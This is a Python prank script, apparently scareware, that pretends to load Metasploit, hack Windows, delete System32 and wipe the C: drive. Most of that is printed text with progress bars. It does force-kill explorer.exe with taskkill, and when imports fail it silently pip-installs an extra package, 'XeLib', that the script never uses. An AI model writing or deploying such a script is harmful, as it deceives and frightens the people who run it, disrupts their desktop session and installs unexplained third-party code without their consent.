import random
import array
from time import sleep
from os import *

try:
    from colorama import *
    from tqdm import *
except:
    system("pip install colorama tqdm XeLib")

def cls():
    system('cls' if name == 'nt' else 'clear')

cls()



def __main__(ti, n, wrd_h):
    for i in range(ti):
        MAX_LEN = n

        DIGITS = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
        LOCASE_CHARACTERS = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h',
                            'i', 'j', 'k', 'm', 'n', 'o', 'p', 'q',
                            'r', 's', 't', 'u', 'v', 'w', 'x', 'y',
                            'z']

        UPCASE_CHARACTERS = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
                            'I', 'J', 'K', 'M', 'N', 'O', 'P', 'Q',
                            'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y',
                            'Z']

        SYMBOLS = ['@', '#', '$', '%', '=', ':', '?', '.', '/', '|', '~', '>',
                '*', '(', ')', '<']

        COMBINED_LIST = DIGITS + UPCASE_CHARACTERS + LOCASE_CHARACTERS + SYMBOLS

        rand_digit = random.choice(DIGITS)
        rand_upper = random.choice(UPCASE_CHARACTERS)
        rand_lower = random.choice(LOCASE_CHARACTERS)
        rand_symbol = random.choice(SYMBOLS)

        temp_pass = rand_digit + rand_upper + rand_lower + rand_symbol


        for x in range(MAX_LEN - 4):
            temp_pass = temp_pass + random.choice(COMBINED_LIST)

            temp_pass_list = array.array('u', temp_pass)
            random.shuffle(temp_pass_list)

        password = ""
        for x in temp_pass_list:
                password = password + x
                
        print("$ " +Fore.GREEN+ password +Fore.RED+ wrd_h)

        sleep(0.05)

def script():
    print(Fore.RED+ "Loading Metasploit..." +Fore.RESET)
    for i in tqdm(range(100)):
        sleep(0.01)
    print(Fore.RED+ "Locating System32" +Fore.RESET)
    for i in tqdm(range(100)):
        sleep(0.009)
    __main__(1, 999, ": system secret code")
    print("hacking into windows...")
    print("~ diskpart")
    print("~ list disk")
    print("disk 0: C:")
    sleep(3)
    __main__(100, 90, ": system passcode")
    print(Fore.RED+ "Attempting to delete System32" +Fore.RESET)
    for i in tqdm(range(10000)):
        sleep(0.0001)
    print(Fore.RED+ "Attempting to delete System32 - Failed!" +Fore.RESET)
    print("~ del /f C:")
    for i in tqdm(range(100000)):
        sleep(0.0000000000000000000000000000000000001)
    print(Fore.GREEN+ "done deleting C:" +Fore.RESET)
    system("taskkill /f /im explorer.exe")
    print("GOODBYE!")

    
    
    

script()

